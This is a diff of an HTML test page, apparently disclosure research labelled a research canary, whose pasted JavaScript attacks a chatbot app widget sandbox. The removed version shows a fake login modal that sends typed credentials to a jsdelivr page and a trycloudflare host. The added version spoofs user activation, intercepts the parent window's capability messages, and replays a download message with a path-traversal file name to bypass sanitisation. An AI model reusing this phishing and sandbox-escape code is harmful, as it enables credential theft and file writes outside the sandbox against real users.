@@ -1,21 +1,17 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>T45 clean copy page</title></head>
+<head><meta charset="utf-8"><title>T46 clean copy page</title></head>
 <body style="font-family:monospace;background:#111;color:#ccc;padding:20px">
-<h2 style="color:#f33">T45 CLEAN COPY PAGE (CDN gate test) &mdash; click Copy, then paste into the playground editor</h2>
+<h2 style="color:#f33">T46 CLEAN COPY PAGE (download replay bypass) &mdash; click Copy, then paste into the playground editor</h2>
 <button id="copy" style="font-size:18px;padding:10px 20px">Copy code</button>
-<pre id="code" style="background:#000;color:#0f0;padding:12px;white-space:pre;overflow:auto">// T45 - CDN gate bypass / full exfil chain proof (Pluto Security research canary)
-// Login-modal replica; on canary capture, fires openExternal at:
-//   1. attacker-published (researcher-owned) leak page on cdn.jsdelivr.net,
-//      carrying the canary credentials in the URL hash  -&gt;  if the gate lets
-//      the CSP-allowlisted CDN through SILENTLY, the leak page (no CSP) sends
-//      them to the researcher's own receiver. Canary data only.
-//   2. example.com (control, known silent from T33).
+<pre id="code" style="background:#000;color:#0f0;padding:12px;white-space:pre;overflow:auto">// T46 - download message replay bypass (Pluto Security research canary)
+// Captures the real download message (capability + post-sanitize name) in transit
+// on the runner window, then replays it with a RAW PATH NAME - skipping the
+// widget-realm bootstrap wrapper entirely. Inert canaries only; disk is ground truth.
 (function () {
   var API = window.oai || window.openai || window.webplus;
-  var T = "https://same-disc-constructed-brussels.trycloudflare.com";
-  var LEAK = "https://cdn.jsdelivr.net/gh/Pando0192/playground-snippet@cb321f10e3652c59692d908e95b9b8b8e754c683/leak.html";
 
+  // 1) spoof activation (T11-proven path)
   try {
     Object.defineProperty(navigator, "userActivation", {
       get: function () { return { isActive: true, hasBeenActive: true }; },
@@ -25,35 +21,61 @@
   try { if (API &amp;&amp; API.requestDisplayMode) { API.requestDisplayMode({ mode: "fullscreen" }); } } catch (e) {}
 
   var d = document;
+  var p = window.parent;
+
+  // 2) capture every message with a capability in it, on the RUNNER window
+  window.__t46 = { raw: null, data: null, origin: null, ports: 0, n: 0 };
+  try {
+    p.addEventListener("message", function (e) {
+      try {
+        var s = JSON.stringify(e.data);
+        if (s &amp;&amp; s.indexOf("capability") !== -1) {
+          window.__t46.data = e.data;
+          window.__t46.raw = s;
+          window.__t46.origin = e.origin;
+          window.__t46.ports = (e.ports || []).length;
+          window.__t46.n++;
+          try {
+            var b = p.document.getElementById("t46rb");
+            if (!b) {
+              b = p.document.createElement("div");
+              b.id = "t46rb";
+              b.style.cssText = "position:fixed;left:8px;top:8px;z-index:2147483647;font:11px Menlo,monospace;color:#ff5252;background:rgba(0,0,0,.85);border:1px solid #ff5252;border-radius:4px;padding:4px 8px;max-width:70vw;white-space:pre-wrap";
+              p.document.body.appendChild(b);
+            }
+            b.textContent = "T46 captured download message (" + s.length + " chars, ports=" + window.__t46.ports + "):\n" + s.slice(0, 600);
+          } catch (e2) {}
+        }
+      } catch (err) {}
+    }, false);
+  } catch (e) {}
+
+  // 3) modal (login replica look)
   var ov = d.createElement("div");
-  ov.id = "t45-ov";
+  ov.id = "t46-ov";
   var css = d.createElement("style");
   css.textContent = [
-    "#t45-ov{position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.55);display:flex;align-items:center;justify-content:center;font-family:'Sohne',-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif}",
-    "#t45-modal{position:relative;width:400px;max-width:calc(100vw - 48px);box-sizing:border-box;background:#212121;border:1px solid rgba(255,255,255,.07);border-radius:24px;padding:28px 28px 32px;box-shadow:0 24px 64px rgba(0,0,0,.5);text-align:center;color:#fff}",
-    "#t45-x{position:absolute;top:14px;right:16px;width:28px;height:28px;border:none;background:transparent;color:#fff;font-size:18px;line-height:28px;cursor:pointer;border-radius:999px}",
-    "#t45-x:hover{background:rgba(255,255,255,.1)}",
-    "#t45-modal h1{font-size:20px;font-weight:600;line-height:1.3;margin:0 0 8px;color:#fff}",
-    "#t45-modal p.sub{font-size:14px;color:#9b9b9b;line-height:1.5;margin:0 0 22px}",
-    "#t45-modal button.t45-sso{width:100%;height:48px;background:transparent;border:1px solid rgba(255,255,255,.18);border-radius:999px;font-size:15px;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:12px}",
-    "#t45-modal button.t45-sso:hover{background:rgba(255,255,255,.06)}",
-    "#t45-or{display:flex;align-items:center;gap:12px;margin:16px 4px 18px;color:#8f8f8f;font-size:13px}",
-    "#t45-or:before,#t45-or:after{content:'';flex:1;height:1px;background:rgba(255,255,255,.15)}",
-    "#t45-modal input{width:100%;box-sizing:border-box;height:48px;padding:0 16px;font-size:15px;border:1px solid rgba(255,255,255,.12);border-radius:12px;background:rgba(0,0,0,.35);color:#fff;outline:none;margin-bottom:16px}",
-    "#t45-modal input::placeholder{color:#8f8f8f}",
-    "#t45-modal input:focus{border-color:rgba(255,255,255,.4)}",
-    "#t45-modal button.t45-cta{width:100%;height:48px;background:#fff;color:#0d0d0d;border:none;border-radius:999px;font-size:15px;font-weight:600;cursor:pointer;margin:0}",
-    "#t45-modal button.t45-cta:hover{background:#ececec}",
-    "#t45-ch{border:2px solid #ff5252;border-radius:12px;padding:14px;text-align:left;font-family:Menlo,Consolas,monospace;font-size:12px;background:rgba(0,0,0,.35);color:#ff8a8a;line-height:1.7}",
-    "#t45-ch b{font-size:13px;color:#ff5252}",
-    "#t45-ch div.ch{color:#ffc9c9}",
-    "#t45-corner{position:fixed;right:8px;bottom:8px;z-index:2147483647;font-family:Menlo,monospace;font-size:10px;color:#ff5252;background:rgba(0,0,0,.75);padding:2px 6px;border:1px solid #ff5252;border-radius:4px}",
-    "#t45-corner button{margin-left:6px;cursor:pointer;font-size:10px;font-family:inherit;color:#ff5252;background:transparent;border:none}"
+    "#t46-ov{position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.55);display:flex;align-items:center;justify-content:center;font-family:'Sohne',-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif}",
+    "#t46-modal{position:relative;width:560px;max-width:calc(100vw - 48px);max-height:calc(100vh - 48px);overflow:auto;box-sizing:border-box;background:#212121;border:1px solid rgba(255,255,255,.07);border-radius:24px;padding:28px 28px 32px;box-shadow:0 24px 64px rgba(0,0,0,.5);text-align:center;color:#fff}",
+    "#t46-x{position:absolute;top:14px;right:16px;width:28px;height:28px;border:none;background:transparent;color:#fff;font-size:18px;line-height:28px;cursor:pointer;border-radius:999px}",
+    "#t46-x:hover{background:rgba(255,255,255,.1)}",
+    "#t46-modal h1{font-size:20px;font-weight:600;line-height:1.3;margin:0 0 8px;color:#fff}",
+    "#t46-modal p.sub{font-size:14px;color:#9b9b9b;line-height:1.5;margin:0 0 22px}",
+    "#t46-modal input{width:100%;box-sizing:border-box;height:48px;padding:0 16px;font-size:15px;border:1px solid rgba(255,255,255,.12);border-radius:12px;background:rgba(0,0,0,.35);color:#fff;outline:none;margin-bottom:16px}",
+    "#t46-modal input::placeholder{color:#8f8f8f}",
+    "#t46-modal input:focus{border-color:rgba(255,255,255,.4)}",
+    "#t46-modal button.t46-cta{width:100%;height:48px;background:#fff;color:#0d0d0d;border:none;border-radius:999px;font-size:15px;font-weight:600;cursor:pointer;margin:0}",
+    "#t46-modal button.t46-cta:hover{background:#ececec}",
+    "#t46-ch{border:2px solid #ff5252;border-radius:12px;padding:14px;text-align:left;font-family:Menlo,Consolas,monospace;font-size:11.5px;background:rgba(0,0,0,.35);color:#ff8a8a;line-height:1.6}",
+    "#t46-ch b{font-size:13px;color:#ff5252}",
+    "#t46-ch pre{white-space:pre-wrap;word-break:break-all;color:#ffc9c9;margin:6px 0}",
+    "#t46-corner{position:fixed;right:8px;bottom:8px;z-index:2147483647;font-family:Menlo,monospace;font-size:10px;color:#ff5252;background:rgba(0,0,0,.75);padding:2px 6px;border:1px solid #ff5252;border-radius:4px}",
+    "#t46-corner button{margin-left:6px;cursor:pointer;font-size:10px;font-family:inherit;color:#ff5252;background:transparent;border:none}"
   ].join("");
   ov.appendChild(css);
 
   var modal = d.createElement("div");
-  modal.id = "t45-modal";
+  modal.id = "t46-modal";
   ov.appendChild(modal);
 
   function el(html) {
@@ -61,13 +83,10 @@
     t.innerHTML = html;
     return t.firstElementChild;
   }
-  var gSvg = '&lt;svg width="18" height="18" viewBox="0 0 18 18"&gt;&lt;path fill="#4285F4" d="M17.64 9.2c0-.64-.06-1.25-.16-1.84H9v3.48h4.84a4.14 4.14 0 0 1-1.8 2.72v2.26h2.92c1.7-1.57 2.68-3.88 2.68-6.62z"/&gt;&lt;path fill="#34A853" d="M9 18c2.43 0 4.47-.8 5.96-2.18l-2.92-2.26c-.8.54-1.84.86-3.04.86-2.34 0-4.32-1.58-5.03-3.7H.96v2.32A9 9 0 0 0 9 18z"/&gt;&lt;path fill="#FBBC05" d="M3.97 10.72a5.4 5.4 0 0 1 0-3.44V4.96H.96a9 9 0 0 0 0 8.08l3.01-2.32z"/&gt;&lt;path fill="#EA4335" d="M9 3.58c1.32 0 2.5.45 3.43 1.35l2.58-2.58C13.46.9 11.43 0 9 0A9 9 0 0 0 .96 4.96l3.01 2.32C4.68 5.16 6.66 3.58 9 3.58z"/&gt;&lt;/svg&gt;';
-  var aSvg = '&lt;span style="font-size:19px;line-height:1;color:#fff"&gt;\uF8FF&lt;/span&gt;';
-  var pSvg = '&lt;svg width="18" height="18" viewBox="0 0 24 24" fill="none"&gt;&lt;path d="M6.6 10.5c1-1.9 1.4-3.9 1.3-6l4.7 4.7c1.9-1 3.6-1.2 4.6-.6 1.2.7 1.2 2.5.1 4.6l2.6 2.6-2 2-2.4-2.4c-2.5 1.4-4.7 1.6-6 .4-1-.9-1.2-2.5-.4-4.5L5.7 12.9c-.9-.9-.8-1.8.9-2.4z" fill="#fff"/&gt;&lt;/svg&gt;';
 
   function xBtn() {
     var x = d.createElement("button");
-    x.id = "t45-x"; x.type = "button"; x.textContent = "\u2715";
+    x.id = "t46-x"; x.type = "button"; x.textContent = "\u2715";
     x.onclick = function () { ov.remove(); corner.remove(); };
     return x;
   }
@@ -77,15 +96,11 @@
     modal.appendChild(xBtn());
     modal.appendChild(el("&lt;h1&gt;Log in or sign up&lt;/h1&gt;"));
     modal.appendChild(el('&lt;p class="sub"&gt;You\u2019ll get smarter responses and can upload files, images, and more.&lt;/p&gt;'));
-    modal.appendChild(el('&lt;button class="t45-sso" type="button"&gt;' + gSvg + " Continue with Google&lt;/button&gt;"));
-    modal.appendChild(el('&lt;button class="t45-sso" type="button"&gt;' + aSvg + " Continue with Apple&lt;/button&gt;"));
-    modal.appendChild(el('&lt;button class="t45-sso" type="button"&gt;' + pSvg + " Continue with phone&lt;/button&gt;"));
-    modal.appendChild(el('&lt;div id="t45-or"&gt;OR&lt;/div&gt;'));
     var em = d.createElement("input");
     em.type = "email"; em.placeholder = "Email address"; em.autocomplete = "username";
     modal.appendChild(em);
     var go = d.createElement("button");
-    go.className = "t45-cta"; go.type = "button"; go.textContent = "Continue";
+    go.className = "t46-cta"; go.type = "button"; go.textContent = "Continue";
     go.onclick = function () { if (em.value.trim()) renderPwStep(em.value.trim()); };
     modal.appendChild(go);
     em.focus();
@@ -100,51 +115,82 @@
     pw.type = "password"; pw.placeholder = "Password"; pw.autocomplete = "current-password";
     modal.appendChild(pw);
     var go = d.createElement("button");
-    go.className = "t45-cta"; go.type = "button"; go.textContent = "Continue";
+    go.className = "t46-cta"; go.type = "button"; go.textContent = "Continue";
     go.onclick = function () { if (pw.value) renderCapture(email, pw.value); };
     modal.appendChild(go);
     pw.focus();
   }
+
+  function esc(s) { return String(s).replace(/&amp;/g, "&amp;amp;").replace(/&lt;/g, "&amp;lt;").replace(/&gt;/g, "&amp;gt;"); }
 
   function setS(id, t) { var e = d.getElementById(id); if (e) e.textContent = t; }
 
   function renderCapture(email, pass) {
     modal.innerHTML = "";
     modal.appendChild(xBtn());
-    modal.appendChild(el("&lt;h1&gt;T45 \u2014 captured&lt;/h1&gt;"));
+    modal.appendChild(el("&lt;h1&gt;T46 \u2014 captured&lt;/h1&gt;"));
     var cap = d.createElement("div");
-    cap.id = "t45-ch";
-    var data = encodeURIComponent("e=" + email + "&amp;p=" + pass);
+    cap.id = "t46-ch";
     cap.innerHTML =
-      "&lt;b&gt;CREDENTIALS CAPTURED BY ATTACKER CODE&lt;/b&gt;&lt;br&gt;" +
-      "(research canary \u2014 nothing stored, sent only to OUR receiver)&lt;br&gt;" +
-      "email: " + JSON.stringify(email).replace(/&lt;/g, "&amp;lt;") + " / password: " + JSON.stringify(pass).replace(/&lt;/g, "&amp;lt;") + "&lt;br&gt;" +
-      "&lt;b&gt;openExternal GATE MATRIX (each fires 2s apart):&lt;/b&gt;&lt;br&gt;" +
-      '&lt;div class="ch" id="t45-s1"&gt;1 jsdelivr leak page (CDN-allowlisted, attacker content): pending&lt;/div&gt;' +
-      '&lt;div class="ch" id="t45-s2"&gt;2 example.com (control, silent per T33): pending&lt;/div&gt;';
+      "&lt;b&gt;RESEARCH CANARY \u2014 nothing real, nothing stored&lt;/b&gt;&lt;br&gt;" +
+      "email: " + esc(JSON.stringify(email)) + " / password: " + esc(JSON.stringify(pass)) + "&lt;br&gt;&lt;br&gt;" +
+      '&lt;div id="t46-s1"&gt;1 anchor download (name T46/../../../canary.txt): firing...&lt;/div&gt;' +
+      '&lt;div id="t46-s2"&gt;2 captured envelope: waiting...&lt;/div&gt;' +
+      '&lt;div id="t46-s3"&gt;3 replay with raw name ../T46b-raw.txt: waiting...&lt;/div&gt;' +
+      '&lt;pre id="t46-pre"&gt;&lt;/pre&gt;';
     modal.appendChild(cap);
 
-    var leaks = [
-      { id: "t45-s1", label: "1 jsdelivr leak page", url: LEAK + "#" + data },
-      { id: "t45-s2", label: "2 example.com", url: "https://example.com/#" + data }
-    ];
-    leaks.forEach(function (L, i) {
-      setTimeout(function () {
-        try {
-          if (API &amp;&amp; API.openExternal) {
-            API.openExternal({ href: L.url }).then(
-              function () { setS(L.id, L.label + ": RESOLVED (silent-open or tab opened \u2014 check for dialog/new tab + my server log)"); },
-              function (e) { setS(L.id, L.label + ": REJECTED " + e); }
-            );
-          } else setS(L.id, L.label + ": openExternal absent");
-        } catch (e) { setS(L.id, L.label + ": threw " + e); }
-      }, 2000 * i);
-    });
+    // step 1: normal anchor download with a PATH-CARRYING canary name (T11-proven path)
+    try {
+      var blob = new Blob(["T46 research canary - Pluto Security - " + new Date().toISOString() + "\n"], { type: "text/plain" });
+      var a = d.createElement("a");
+      a.href = URL.createObjectURL(blob);
+      a.download = "T46/../../../canary.txt";
+      d.body.appendChild(a);
+      a.click();
+      a.remove();
+      setS("t46-s1", "1 anchor download fired (name T46/../../../canary.txt) - check capture");
+    } catch (e) { setS("t46-s1", "1 anchor download threw: " + e); }
+
+    // step 2: show captured envelope
+    setTimeout(function () {
+      var t = window.__t46;
+      if (t &amp;&amp; t.raw) {
+        setS("t46-s2", "2 captured envelope (" + t.n + " msg(s), origin=" + t.origin + ", ports=" + t.ports + "):");
+        var pre = d.getElementById("t46-pre");
+        if (pre) pre.textContent = t.raw.slice(0, 1500);
+
+        // step 3: replay with a raw path name, skipping the widget-side wrapper
+        setTimeout(function () {
+          try {
+            var env = structuredClone(t.data);
+            var name0 = null;
+            (function walk(o) {
+              if (!o || typeof o !== "object") return;
+              for (var k in o) {
+                var v = o[k];
+                if (typeof v === "string" &amp;&amp; (v.indexOf("canary") !== -1 || v.indexOf("T46") !== -1)) { name0 = v; o[k] = "../T46b-raw.txt"; }
+                else if (v &amp;&amp; typeof v === "object") walk(v);
+              }
+            })(env);
+            if (name0 === null) {
+              setS("t46-s3", "3 replay: no name field found in envelope (see pre) - NOT replayed");
+            } else {
+              p.postMessage(env, "*");
+              setS("t46-s3", "3 replayed: name '" + name0 + "' -&gt; '../T46b-raw.txt' posted to runner window. Disk is ground truth (tell the researcher).");
+            }
+          } catch (e) { setS("t46-s3", "3 replay threw: " + e); }
+        }, 1500);
+      } else {
+        setS("t46-s2", "2 captured envelope: NOTHING captured (interception path differs - report)");
+        setS("t46-s3", "3 replay: skipped (nothing captured)");
+      }
+    }, 1500);
   }
 
   var corner = d.createElement("div");
-  corner.id = "t45-corner";
-  corner.textContent = "RESEARCH CANARY \u2014 Pluto Security (inert demo, own receiver)";
+  corner.id = "t46-corner";
+  corner.textContent = "RESEARCH CANARY \u2014 Pluto Security (inert demo)";
   var closeBtn = d.createElement("button");
   closeBtn.textContent = "[x] close";
   closeBtn.onclick = function () { ov.remove(); corner.remove(); };
